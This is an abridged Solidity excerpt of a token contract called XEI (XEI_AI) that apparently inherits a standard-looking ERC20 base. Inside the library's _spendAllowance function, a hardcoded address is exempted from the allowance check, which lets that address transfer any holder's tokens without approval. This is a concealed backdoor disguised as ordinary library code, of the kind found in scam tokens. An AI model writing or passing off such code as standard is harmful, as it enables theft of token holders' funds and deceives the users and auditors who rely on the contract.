...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max && spender != 0xff896D5fB04305883214106742607Ae99c46B1f4) {
...
contract XEI_AI is ERC20, Ownable {
    ...
    constructor() ERC20("XEI", "XEI"){
        ...
        marketingWallet = payable(0x3E8D55C6E07711aAE0AAACD6Fa73295605Dd9b58);
